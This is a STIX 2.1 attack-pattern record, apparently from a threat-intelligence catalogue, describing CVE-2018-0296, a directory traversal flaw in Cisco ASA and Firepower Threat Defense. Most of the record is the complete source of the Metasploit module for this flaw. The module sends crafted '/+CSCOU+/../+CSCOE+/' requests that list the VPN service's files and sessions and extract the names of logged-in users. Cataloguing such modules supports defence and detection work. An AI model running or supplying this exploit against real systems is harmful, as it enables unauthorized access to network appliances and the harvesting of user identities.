{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--809c025a-206b-4b7d-b29c-c2983e4b761c",
    "created": "2024-08-14T16:30:27.628642Z",
    "modified": "2024-08-14T16:30:27.628646Z",
    "name": "Cisco ASA Directory Traversal",
    "description": " This module exploits a directory traversal vulnerability in Cisco's Adaptive Security Appliance (ASA) software and Firepower Threat Defense (FTD) software. It lists the contents of Cisco's VPN web service which includes directories, files, and currently logged in users. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/cisco_directory_traversal.rb",
            "external_id": "cisco_directory_traversal.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-0296"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Cisco ASA Directory Traversal',\n      'Description'    => %q{\n        This module exploits a directory traversal vulnerability in Cisco's Adaptive Security Appliance (ASA) software and Firepower Threat Defense (FTD) software.\n        It lists the contents of Cisco's VPN web service which includes directories, files, and currently logged in users.\n      },\n      'Author'         => [ 'Micha\u0142 Bentkowski',  # Discovery\n                            'Yassine Aboukir',    # PoC\n                            'Shelby Pace'         # Metasploit Module\n                          ],\n      'License'        => MSF_LICENSE,\n      'References'     => [\n                           [ 'CVE', '2018-0296' ],\n                           [ 'EDB', '44956' ]\n                          ],\n      'DisclosureDate' => '2018-06-06'\n    ))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [ true, 'Path to Cisco installation', '/' ]),\n        OptBool.new('SSL', [ true, 'Use SSL', true ]),\n        Opt::RPORT(443)\n      ])\n  end\n\n  def is_accessible?\n    uri = normalize_uri(target_uri.path, '+CSCOE+/logon.html')\n\n    res = send_request_cgi(\n      'method'  =>  'GET',\n      'uri'     =>  uri\n    )\n\n    return (res && (res.body.include?(\"SSL VPN Service\") || res.body.include?(\"+CSCOE+\") || res.body.include?(\"+webvpn+\") || res.body.include?(\"webvpnlogin\")))\n  end\n\n  def list_files(path)\n    uri = normalize_uri(target_uri.path, path)\n\n    list_res = send_request_cgi(\n      'method'  =>  'GET',\n      'uri'     =>  uri\n    )\n\n    if list_res && list_res.code == 200\n      if list_res.body.match(/\\/{3}sessions/)\n        get_sessions(list_res.body)\n      else\n        print_good(list_res.body)\n      end\n    end\n  end\n\n  def get_sessions(response)\n    session_nos = response.scan(/([0-9]{2,})/)\n\n    if session_nos.empty?\n      print_status(\"Could not detect any sessions\")\n      print(\"\\n\")\n      return\n    end\n\n    print_good(response)\n    list_users(session_nos)\n  end\n\n  def list_users(sessions)\n    sessions_uri = '/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions/'\n    user_ids = Array.new\n\n    sessions.each do |session_no|\n      users_res = send_request_cgi(\n        'method'  =>  'GET',\n        'uri'     =>  normalize_uri(target_uri.path, sessions_uri, session_no)\n      )\n\n      if users_res && users_res.body.include?('name')\n        user_ids.push(users_res.body.match(/user:(\\w+)/).to_s)\n      end\n    end\n\n    unless user_ids.empty?\n      print_status('Users logged in:')\n      user_ids.each { |id| print_good(id) }\n      print(\"\\n\")\n      return\n    end\n\n    print_status(\"There are no users logged in currently\")\n  end\n\n  def run\n    file_uri = '/+CSCOU+/../+CSCOE+/files/file_list.json?path=/'\n    sessions_uri = '/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions/'\n    cscoe_uri = '/+CSCOU+/../+CSCOE+/files/file_list.json?path=%2bCSCOE%2b'\n\n    paths = [file_uri, sessions_uri, cscoe_uri]\n\n    unless is_accessible?\n      fail_with(Failure::NotFound, 'Failed to reach Cisco web logon service')\n    end\n\n    paths.each { |path| list_files(path) }\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-06-06"
}